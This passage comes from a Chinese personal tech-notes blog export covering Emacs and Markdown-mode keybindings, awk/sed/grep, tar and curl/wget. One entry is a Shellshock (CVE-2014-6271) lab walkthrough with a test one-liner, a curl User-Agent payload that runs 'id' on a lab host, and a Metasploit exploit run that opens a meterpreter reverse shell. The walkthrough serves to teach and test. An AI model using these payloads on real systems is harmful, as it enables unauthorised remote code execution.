C-c</td><td></td></tr></tbody></table><h2 id="Latex-数学公式"><a href="#Latex-数学公式" class="headerlink" title="Latex/数学公式"></a>Latex/数学公式</h2><table><thead><tr><th align="center">操作</th><th align="center">keybinding</th><th align="center">function</th></tr></thead><tbody><tr><td align="center">开关支持</td><td align="center">C-c C-x C-e</td><td align="center"></td></tr></tbody></table><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><a href="https://mermaid-js.github.io/" title="官网">Mermaid</a><br><a href="https://mermaid-js.github.io/mermaid-live-editor/">在线编辑器</a></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="脚注"><a href="#脚注" class="headerlink" title="脚注"></a>脚注</h3><table><thead><tr><th align="center">操作</th><th align="center">keybinding</th><th align="center">function</th></tr></thead><tbody><tr><td align="center"></td><td align="center">C-c C-s f</td><td align="center"></td></tr><tr><td align="center"></td><td align="center">C-c C-a f</td><td align="center"></td></tr></tbody></table><h3 id="邮箱"><a href="#邮箱" class="headerlink" title="邮箱"></a>邮箱</h3><p><a href="mailto:&#x61;&#115;&#107;&#x64;&#105;&#x6e;&#x67;&#x40;&#113;&#x71;&#x2e;&#99;&#111;&#x6d;">&#x61;&#115;&#107;&#x64;&#105;&#x6e;&#x67;&#x40;&#113;&#x71;&#x2e;&#99;&#111;&#x6d;</a></p><pre><code class="markdown">&lt;askding@qq.com&gt;</code></pre><h3 id="强制分页"><a href="#强制分页" class="headerlink" title="强制分页"></a>强制分页</h3><p>在 markdown 文本中需要分页的地方添入:</p><pre><code class="html"> &lt;div STYLE=&quot;page-break-after: always     ;&quot;&gt;&lt;/div&gt;</code></pre><h3 id="文本换行"><a href="#文本换行" class="headerlink" title="文本换行"></a>文本换行</h3><pre><code class="markdown">&lt;br/&gt;</code></pre><p>参考<br><a href="https://leanpub.com/markdown-mode/read">Markdown-mode</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Evolution </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>emacs</title>
      <link href="Tools/emacs.html"/>
      <url>Tools/emacs.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p>EMACS(Editor MACroS)</p><p>在 Emacs 中, 我们有一条规定:</p><table><thead><tr><th>key binding</th><th>Description</th></tr></thead><tbody><tr><td><code>C-&lt;字符&gt;</code></td><td>在输入 <code>&lt;字符&gt;</code> 时按住 Control</td></tr><tr><td><code>M-&lt;字符&gt;</code></td><td>在输入 <code>&lt;字符&gt;</code> 时按住 Alt</td></tr><tr><td><code>s-&lt;字符&gt;</code></td><td>在输入 <code>&lt;字符&gt;</code> 时按住 Super</td></tr></tbody></table><h1 id="Emacs帮助信息"><a href="#Emacs帮助信息" class="headerlink" title="Emacs帮助信息"></a>Emacs帮助信息</h1><table><thead><tr><th>key binding</th><th>Description</th></tr></thead><tbody><tr><td><code>C-h t</code></td><td>帮助-教程tutorial</td></tr><tr><td><code>C-h k</code></td><td>帮助-快捷键</td></tr><tr><td><code>C-h f</code></td><td>帮助-函数介绍functions</td></tr><tr><td><code>C-h v</code></td><td>帮助-变量介绍varialbes</td></tr></tbody></table><h1 id="窗口操作"><a href="#窗口操作" class="headerlink" title="窗口操作"></a>窗口操作</h1><table><thead><tr><th>key binding</th><th>Description</th></tr></thead><tbody><tr><td><code>C-x 0</code></td><td>关闭当前窗口</td></tr><tr><td><code>C-x 1</code></td><td>只保留当前窗口</td></tr><tr><td><code>C-x 2</code></td><td>水平分割窗口</td></tr><tr><td><code>C-x 3</code></td><td>垂直分割窗口</td></tr><tr><td><code>C-x o</code></td><td>切换窗口</td></tr></tbody></table><h1 id="缓冲区buffer操作"><a href="#缓冲区buffer操作" class="headerlink" title="缓冲区buffer操作"></a>缓冲区buffer操作</h1><table><thead><tr><th>key binding</th><th>Description</th></tr></thead><tbody><tr><td><code>C-x C-b</code></td><td>打开buffer列表</td></tr><tr><td><code>C-x b</code></td><td>切换buffer</td></tr><tr><td><code>C-x &lt;L/R&gt;</code></td><td>切换buffer</td></tr><tr><td><code>C-x k</code></td><td>关闭buffer</td></tr></tbody></table><h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><h2 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h2><table><thead><tr><th>key binding</th><th>Description</th></tr></thead><tbody><tr><td><code>C-x d</code></td><td>打开目录</td></tr><tr><td><code>C-x C-f</code></td><td>查找/创建文件</td></tr></tbody></table><h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><table><thead><tr><th>key binding</th><th>Description</th></tr></thead><tbody><tr><td><code>C-s</code></td><td>向下搜索</td></tr><tr><td><code>C-r</code></td><td>向上搜索</td></tr></tbody></table><h2 id="编辑文件-buffer"><a href="#编辑文件-buffer" class="headerlink" title="编辑文件/buffer"></a>编辑文件/buffer</h2><h3 id="移动"><a href="#移动" class="headerlink" title="移动"></a>移动</h3><p><code>C-u &lt;num&gt; &lt;key&gt;</code>  执行<code>&lt;num&gt;</code>次<code>&lt;key&gt;</code></p><pre><code class="zsh">    |M-&lt;(开头)                     :C-l |                         :居顶 |                           M-v(翻屏)    |C-a(行首)                               :            C-e(行尾)    |M-a(句首)                           :                    M-e(句尾)    |                           :    |                             C-p(上行)    |                              :C-l |             (左移字符/单词)C-b/M-b ...|_(光标) ....  C-f/M-f(右移字符/单词）    居中|                                           :    |                             C-n(下行)    |                              :    |                               :    |                           :    |                           :    |                            C-v(翻屏)    |                                          :C-l |                         :居底|                                        :             M-&gt;(结尾)</code></pre><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><pre><code class="zsh">    |                                           :    |M-k(删除光标至行首)                 ...|_(光标)...               C-k(光标至行尾、重复则删除换行符)    |                                           :    |    (删除字符)&lt;DEL&gt;/(移除单词)M-&lt;DEL&gt; .... |_(光标) ....  C-d(删除字符/M-d(移除单词）    |                                           :</code></pre><h3 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h3><table><thead><tr><th>key binding</th><th>Description</th></tr></thead><tbody><tr><td><code>C-@</code></td><td>开启标记</td></tr></tbody></table><h3 id="复制-剪贴"><a href="#复制-剪贴" class="headerlink" title="复制/剪贴"></a>复制/剪贴</h3><table><thead><tr><th>key binding</th><th>Description</th></tr></thead><tbody><tr><td><code>M-w</code></td><td>复制</td></tr><tr><td><code>C-w</code></td><td>剪贴</td></tr></tbody></table><h3 id="粘贴"><a href="#粘贴" class="headerlink" title="粘贴"></a>粘贴</h3><table><thead><tr><th>key binding</th><th>Description</th></tr></thead><tbody><tr><td><code>C-y</code></td><td>粘贴</td></tr></tbody></table><h3 id="撤销-重做"><a href="#撤销-重做" class="headerlink" title="撤销/重做"></a>撤销/重做</h3><table><thead><tr><th>key binding</th><th>Description</th></tr></thead><tbody><tr><td><code>C-x u</code></td><td>仅撤销</td></tr><tr><td><code>C-/</code></td><td>撤销/重做</td></tr><tr><td><code>C-_</code></td><td>撤销/重做</td></tr></tbody></table><h2 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h2><table><thead><tr><th>key binding</th><th>Description</th></tr></thead><tbody><tr><td><code>C-x C-s</code></td><td>保存当前buffer到对应文件</td></tr><tr><td><code>C-x s</code></td><td>保存所有buffer到对应文件</td></tr></tbody></table><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>awk-sed-grep-find</title>
      <link href="Tools/awk-sed-grep-find.html"/>
      <url>Tools/awk-sed-grep-find.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><p><input checked="" disabled="" type="checkbox"> </p></li><li><p>记住三个命令的运用形式<br>   grep    ‘字符’       文件     擅长查找文件内容<br>   sed     ‘命令’       文件     擅长取行和替换<br>   awk    ‘条件{命令}’   文件     擅长取列,统计</p></li><li><p>单引号内就是正则表达式的用法</p></li></ul><h1 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h1><p>处理过程：</p><ol><li>将文件中的第一行作为输入，然后将此行放入模式空间，并将此行(以换行符结束)赋给内部变量$0</li><li>字段分解(默认IFS为空格,可通过-F来修改)，切割整行内容，并将切割后的字段依次赋给$1,$2..$n ,NF=n, NR+=1（NR=0）</li><li>检查print函数需要打印的字段，从模式空间中取出字段对应的值，输出结果到屏幕以空格为分割(可通过内部变量OFS进行调整)</li><li>继续将第二行载入模式空间，并将其值存储在$0中，覆盖原来的内容</li><li>重复1-4</li></ol><pre><code class="shell">awk  [options] &#39;commands&#39; filenameawk [options] -f awk-script-file filename&lt;commands&gt;部分：预处理       行处理       处理后BEGIN&#123; &#125;      &#123;&#125;        END&#123;&#125;</code></pre><p>常见用法： 匹配+处理</p><pre><code class="shell">awk  -F &quot;[ :\t]+&quot;  &#39;BEGIN&#123; OFS=&quot;--&quot; &#125;   /&lt;pattern&gt;/&#123; if (&lt;condition&gt;) &#123;&lt;if_true_statment&gt;&#125; else&#123;&lt;if_false_statment&gt;&#125; &#125;   END&#123;&#125;&#39;    /path/to/file</code></pre><ul><li><code>-F &quot;[ :\t]+&quot; </code>指定多个IFS,可以多个冒号和空格和tab键</li><li><code>NF</code> 每行最后一列的$<n>，将<n>复制给NF, <code>$NF</code> 打印最后一列的值 , <code>FNR</code>用于多文件处理</li><li><code>NR</code> 记录行号,从1开始</li><li><code>OFS</code> 逗号,映射为OFS，初始情况下OFS变量是空格</li></ul><h2 id="awk分支语句结构"><a href="#awk分支语句结构" class="headerlink" title="awk分支语句结构"></a>awk分支语句结构</h2><pre><code class="shell">awk &#39;/&lt;pattern&gt;/ &#123; if( &lt;condition&gt; ) &#123; if_true_statement &#125; else if ( &lt;condition&gt; ) &#123; elif_true_statement &#125; else &#123; elif_false_statement &#125; &#125;&#39; /path/to/file</code></pre><h2 id="awk循环语句结构"><a href="#awk循环语句结构" class="headerlink" title="awk循环语句结构"></a>awk循环语句结构</h2><ul><li>while</li></ul><pre><code class="shell">awk -F : &#39;&#123; i=1; while ( &lt;condition&gt; ) &#123; while_true_statmen &#125;   &#125;&#39; /path/to/file</code></pre><ul><li>for</li></ul><pre><code class="shell">awk -F : &#39; &#123; for ( : : ) &#123;for_true_statement&#125; &#125; &#39; /path/to/file</code></pre><h2 id="打印指定行之间的文本"><a href="#打印指定行之间的文本" class="headerlink" title="打印指定行之间的文本"></a>打印指定行之间的文本</h2><p>类似于<code>cat -n</code></p><pre><code class="zsh">awk &#39;NR==M,NR==N &#123;printf $1&#125;&#39; filenamecat file | awk &#39;NR==M,NR==N&#39;   #打印M行到N行之间的文本</code></pre><h2 id="打印模式之间行的文本"><a href="#打印模式之间行的文本" class="headerlink" title="打印模式之间行的文本"></a>打印模式之间行的文本</h2><pre><code class="zsh">awk &#39;/start_pattern/,/end_pattern/&#39;  filename </code></pre><h2 id="匹配指定列的内容"><a href="#匹配指定列的内容" class="headerlink" title="匹配指定列的内容"></a>匹配指定列的内容</h2><pre><code class="shell">awk -F : &#39;$3 ~ /alice/&#39; /etc/passwdawk -F : &#39;$3 !~ /alice/&#39; /etc/passwd</code></pre><h1 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h1><p>sed命令若无语法错误，返回值永远是0</p><pre><code class="shell">sed [option] &#39;&lt;command&gt;&#39; /path/to/filessed [option] &#39;s/&lt;str_old&gt;/&lt;str_new&gt;/&lt;g/i&gt;&#39;  /path/to/file</code></pre><ul><li>Options<ul><li><code>-e</code> 允许多个’<command>‘</li><li><code>-n</code> 只输出匹配的行</li><li><code>-i</code> 直接修改文件</li><li><code>-r</code> 支持扩展元字符</li></ul></li></ul><ul><li><command>参数 ‘<num>/<pattern>/{&lt;a;i;c;d&gt;} [String]’<ul><li><code>a</code> 追加后面    在当前行后添加一行/多行</li><li><code>i</code> 追加前面    在当前行之前插入文本</li><li><code>c</code> 行替换      在当前行进行替换/修改 </li><li><code>d</code> 删除       在当前行进行删除操作</li><li><code>sg</code> 全局替换</li><li><code>p</code> 打印匹配/指定的行</li></ul></li></ul><h2 id="匹配ip地址"><a href="#匹配ip地址" class="headerlink" title="匹配ip地址"></a>匹配ip地址</h2><pre><code class="shell">ifconfig eth0 | sed -rn &#39;2s#(^.*inet) (.*) (net.*$)#\2#gp&#39;ifconfig eth0 | sed -rn &#39;2s/(^.*inet) (.*) ( net.*$)/\2/gp&#39;ifconfig en0 | sed -rn &#39;5s/(.*inet )(.*)( net.*)/\2/gp&#39;  # mac本地ipifconfig utun2  | sed  -rn &#39;2s/(^.*inet )(.*)( --&gt;.*$)/\2/gp&#39;</code></pre><h1 id="grep-egrep"><a href="#grep-egrep" class="headerlink" title="grep/egrep"></a>grep/egrep</h1><h2 id="匹配ip地址-1"><a href="#匹配ip地址-1" class="headerlink" title="匹配ip地址"></a>匹配ip地址</h2><pre><code class="shell">ifconfig eth0 | grep netmask | egrep &quot;([0-9]|\.)&#123;1,4&#125;&quot;</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TAR</title>
      <link href="Tools/TAR.html"/>
      <url>Tools/TAR.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> tar(tape archive) 命令可以为Linux的文件和目录创建档案。</li></ul><h2 id="归档"><a href="#归档" class="headerlink" title="归档"></a>归档</h2><pre><code class="zsh">tar -cf output.tar file1 file2 ... filen  # 创建归档文件 ,-c创建  -f 归档文件名tar -tvf archive.tar  # 列出归档文件中的文件tar -rf original.tar new_file # 向归档文件追加/替换文件tar -uf archive.tar file1  # 更新归档中的指定文件tar -df archive.tar    # 查看归档中文件与系统中文件的差异tar -f archive.tar --delete file1 file2 ..  # 删除指定文件tar -Af file1.tar file2.tar   # 合并多个tar文件</code></pre><h2 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h2><ul><li><code>-j</code> : bunzip2格式</li><li><code>-z</code> : gzip格式</li><li><code>--lzma</code> : lzma格式</li></ul><pre><code class="zsh">tar -acvf  archive.tar.gz  *  --exclude &quot;*.txt&quot;   # -a根据压缩文件命令自动选择压缩算法,排除指定文件(也可使用-X exclue_file)tar -acvf archive.tar.gz * --excluede-cvs  --totals     # 排除版本控制系统相关文件,显示压缩文件大小</code></pre><h2 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h2><pre><code class="zsh">tar -axvf archive.tar.gz  file1 file4  -C /path/to/extraction_directory   # 根据压缩后缀自动选择解压算法,提取指定文件到指定目录tar -xzvkpf archive.tar    # 解压bunzip2格式文件，-k不覆盖本地已有文件 -p保留文件相关权限</code></pre><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><pre><code class="zsh">tar -cvf - files/ --exclude-cvs | ssh user@server &quot;tar xv -C /tmp&quot; # 对file目录中的文件进行归档并将其输出到stdout(-代表stdout), 然后提取到远程系统中的/tmp目录</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Shellshock</title>
      <link href="Kali/Exploit/Shellshock.html"/>
      <url>Kali/Exploit/Shellshock.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p>GNU Bash 4.3及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，</p><p>攻击者可利用此漏洞改变或绕过环境限制，以执行shell命令。某些服务和应用允许未经身份验证的远程攻击者提供环境变量以利用此漏洞。</p><p>此漏洞源于在调用bash shell之前可以用构造的值创建环境变量。这些变量可以包含代码，在shell被调用后会被立即执行。</p><ul><li>漏洞条件<br>bash &lt; 4.3</li></ul><h2 id="本地检测"><a href="#本地检测" class="headerlink" title="本地检测"></a>本地检测</h2><pre><code class="zsh">env x=&#39;() &#123; :;&#125;; echo Vulnerable CVE-2014-6271 &#39; bash -c &quot;echo test&quot;</code></pre><h2 id="远程检测"><a href="#远程检测" class="headerlink" title="远程检测"></a>远程检测</h2><p>victim.cig内容</p><pre><code class="zsh">#!/usr/local/bash-4.3.0/bin/bashecho &quot;Content-type: text/html&quot;echo &quot;&quot;echo &#39;&lt;html&gt;&#39;echo &#39;&lt;head&gt;&#39;echo &#39;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;&#39;echo &#39;&lt;title&gt;Bash ShellShock&lt;/title&gt;&#39;echo &#39;&lt;/head&gt;&#39;echo &#39;&lt;body&gt;&#39;echo &#39;&lt;p&gt;&#39;echo &#39;Hello world&#39;echo &#39;&lt;/p&gt;&#39;echo &#39;&lt;/body&gt;&#39;echo &#39;&lt;/html&gt;&#39;exit 0</code></pre><h3 id="curl命令检测"><a href="#curl命令检测" class="headerlink" title="curl命令检测"></a>curl命令检测</h3><pre><code class="zsh">curl -X GET &quot;http://192.168.108.223:8080/victim.cgi&quot; -H &#39;User-Agent: () &#123; foo; &#125;; echo Content-Type: text/plain; echo; /usr/bin/id&#39;uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre><h3 id="msf利用"><a href="#msf利用" class="headerlink" title="msf利用"></a>msf利用</h3><pre><code class="zsh">search shellshockMatching Modules================   #   Name                                               Disclosure Date  Rank       Check  Description   -   ----                                               ---------------  ----       -----  -----------   0   auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner   1   auxiliary/server/dhclient_bash_env                 2014-09-24       normal     No     DHCP Client Bash Environment Variable Code Injection (Shellshock)   2   exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01       excellent  Yes    Advantech Switch Bash Environment Variable Code Injection (Shellshock)   3   exploit/linux/http/ipfire_bashbug_exec             2014-09-29       excellent  Yes    IPFire Bash Environment Variable Injection (Shellshock)   4   exploit/multi/ftp/pureftpd_bash_env_exec           2014-09-24       excellent  Yes    Pure-FTPd External Authentication Bash Environment Variable Code Injection (Shellshock)   5   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)   6   exploit/multi/http/cups_bash_env_exec              2014-09-24       excellent  Yes    CUPS Filter Bash Environment Variable Code Injection (Shellshock)   7   exploit/multi/misc/legend_bot_exec                 2015-04-27       excellent  Yes    Legend Perl IRC Bot Remote Code Execution   8   exploit/multi/misc/xdh_x_exec                      2015-12-04       excellent  Yes    Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution   9   exploit/osx/local/vmware_bash_function_root        2014-09-24       normal     Yes    OS X VMWare Fusion Privilege Escalation via Bash Environment Code Injection (Shellshock)   10  exploit/unix/dhcp/bash_environment                 2014-09-24       excellent  No     Dhclient Bash Environment Variable Injection (Shellshock)   11  exploit/unix/smtp/qmail_bash_env_exec              2014-09-24       normal     No     Qmail SMTP Bash Environment Variable Injection (Shellshock)Interact with a module by name or index. For example info 11, use 11 or use exploit/unix/smtp/qmail_bash_env_execmsf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt; optionsModule options (exploit/multi/http/apache_mod_cgi_bash_env_exec):   Name            Current Setting  Required  Description   ----            ---------------  --------  -----------   CMD_MAX_LENGTH  2048             yes       CMD max line length   CVE             CVE-2014-6271    yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)   HEADER          User-Agent       yes       HTTP header to use   METHOD          GET              yes       HTTP method to use   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]   RHOSTS          192.168.108.223  yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;   RPATH           /bin             yes       Target PATH for binaries used by the CmdStager   RPORT           8080             yes       The target port (TCP)   SRVHOST         0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.   SRVPORT         8080             yes       The local port to listen on.   SSL             false            no        Negotiate SSL/TLS for outgoing connections   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)   TARGETURI       victim.cgi       yes       Path to CGI script   TIMEOUT         5                yes       HTTP read response timeout (seconds)   URIPATH                          no        The URI to use for this exploit (default is random)   VHOST                            no        HTTP server virtual hostPayload options (linux/x86/meterpreter/reverse_tcp):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST  192.168.108.223  yes       The listen address (an interface may be specified)   LPORT  4444             yes       The listen portExploit target:   Id  Name   --  ----   0   Linux x86msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt; run[*] Started reverse TCP handler on 192.168.108.223:4444[*] Command Stager progress - 100.46% done (1097/1092 bytes)[*] Sending stage (976712 bytes) to 192.168.108.223[*] Meterpreter session 4 opened (192.168.108.223:4444 -&gt; 192.168.108.223:53118) at 2021-01-08 16:22:26 +0800meterpreter &gt;</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>curl-wget</title>
      <link href="Tools/curl-wget.html"/>
      <url>Tools/curl-wget.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><p>curl是一个精简的命令行浏览器,调试API,类似于postman、Apifox</p><pre><code class="zsh">curl        [-X GET/POST/HEAD/PUT]     \# 请求方法设置       [-G ]      # 请求头设置      [-H &#39;xx: xx&#39;]               \# 设置请求头信息      [-A &#39;Mozilla/5.0***&#39;]       \# 指定User-Agent      [-b &#39;foo=bar&#39;]              \# 指定cookie      [-c cookies.txt]            \# 指定cookie      [-e &#39;https://xxx&#39;]          \# 设定Referer      [-D respHeader.txt]             \# 将服务器响应头信息保存到respHeader.txt 即cookie      [-r 0-100 ]                       \#  设定Range: bytes=start-end 请求资源的部分内容      # 数据设置      [-d &#39;xx&#39;]                   \# POST请求数据(自动设置Content-Type: application/x-www-form-urlencoded)      [-d @local_file]            \# POST请求数据      [--data-urlencode &#39;xx&#39;]     \# 等同于-d,但会对数据进行url编码      [-F &#39;file=@photo.png;filename=me.png;type=application/octet-stream&#39;]      \# 上传二进制文件photo.png(自动设置Content-Type: multipart/form-data, MIME:application/octet-stream 服务器收到的文件名为me.png)      # 认证信息      [-u &#39;bob:12345&#39;]          \# 用户密码(自动设置Authorization: Basic Ym9iOjEyMzQ1)      # 代理设置      [--no-proxy proxyserver]                    \# 跳过passwd@proxyserver代理      [-x user:passwd@proxyserver:port]           \# 默认HTTP代理      [-x socks4://user:passwd@proxyserver:port]  \# socks4代理      [-x socks5://user:passwd@proxyserver:port]  \# socks5代理      # 其他设置      [-s]                  \# slient模式      [--interface eth1 ]   \# 指定网卡      [--local-port]        \# 指定源端口      [-S]                  \# 仅输出错误信息      [-k]                  \# 跳过SSL检测      [-v]                  \# 显示请求过程      [-#]                  \# 显示进度条      [-I]                  \# 显示请求头 =[-X HEAD]      [-i]                  \# 显示响应头      [-C -]                \# 断点续传      [-L]                  \# 自动重定向      [-o example.html]     \# 保存html页面      [-O ]                 \# 保存与服务器url中同名的文件名</code></pre><h3 id="常用格式"><a href="#常用格式" class="headerlink" title="常用格式"></a>常用格式</h3><pre><code class="zsh">curl -X &lt;VERB&gt;  &#39;&lt;PROTOCOL&gt;://&lt;HOST&gt;:&lt;PORT&gt;/&lt;PATH&gt;?&lt;QUERY_STRING&gt;&#39;  -d &#39;&lt;BODY&gt;&#39;</code></pre><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>VERB</code></td><td>适当的 HTTP <em>方法</em> 或 <em>谓词</em> : <code>GET</code>、 <code>POST</code>、 <code>PUT</code>、 <code>HEAD</code> 或者 <code>DELETE</code>。</td></tr><tr><td><code>PROTOCOL</code></td><td><code>http</code> 或者 <code>https</code>（如果你在 Elasticsearch 前面有一个 <code>https</code> 代理）</td></tr><tr><td><code>HOST</code></td><td>Elasticsearch 集群中任意节点的主机名，或者用 <code>localhost</code> 代表本地机器上的节点。</td></tr><tr><td><code>PORT</code></td><td>运行 Elasticsearch HTTP 服务的端口号，默认是 <code>9200</code> 。</td></tr><tr><td><code>PATH</code></td><td>API 的终端路径（例如 <code>_count</code> 将返回集群中文档数量）。Path 可能包含多个组件，例如：<code>_cluster/stats</code> 和 <code>_nodes/stats/jvm</code> 。</td></tr><tr><td><code>QUERY_STRING</code></td><td>任意可选的查询字符串参数 (例如 <code>?pretty</code> 将格式化地输出 JSON 返回值，使其更容易阅读)</td></tr><tr><td><code>BODY</code></td><td>一个 JSON 格式的请求体 (如果请求需要的话)</td></tr></tbody></table><h3 id="curl上传文件"><a href="#curl上传文件" class="headerlink" title="curl上传文件"></a>curl上传文件</h3><pre><code class="html">&lt;form action=&quot;submit.cgi&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;   Name: &lt;input type=&quot;text&quot; name=&quot;person&quot;&gt;&lt;br&gt;   File: &lt;input type=&quot;file&quot; name=&quot;secret&quot;&gt;&lt;br&gt;   &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;&lt;/form&gt;</code></pre><pre><code class="zsh">curl -F person=anonymous -F secret=@file.txt http://example.com/submit.cgi</code></pre><h3 id="发送JSON格式的请求"><a href="#发送JSON格式的请求" class="headerlink" title="发送JSON格式的请求"></a>发送JSON格式的请求</h3><pre><code class="zsh">curl -XGET &#39;http://localhost:9200/_count?pretty&#39; -d &#39;&#123;    &quot;query&quot;: &#123;        &quot;match_all&quot;: &#123;&#125;    &#125;&#125;&#39;&#123;    &quot;count&quot; : 0,    &quot;_shards&quot; : &#123;        &quot;total&quot; : 5,        &quot;successful&quot; : 5,        &quot;failed&quot; : 0    &#125;&#125;</code></pre><h2 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h2><p>wget是一个下载工具</p><pre><code class="zsh">wget  [-t 5]  \ #网络不稳定导致的终端，重试下载次数,0表示不断重试      [-O output_name]   \ # 指定输出文件名      [--limit-rate 20k]   \# 限速 20k      [-c]     \ # 断点续传      [--mirror --convert-links]   \# 复制整个网站      [-r]      \# 递归下载      [--user username --password pass]  \# 提供身份验证      [--user-agent=&quot;Mozilla/5.0&quot;] \ #指定user-agent      [-P /tmp]   \ #指定下载目录      URL1 URL2 ... URLn</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Elasticsearch</title>
      <link href="Kali/Exploit/Elasticsearch.html"/>
      <url>Kali/Exploit/Elasticsearch.html</url>
      
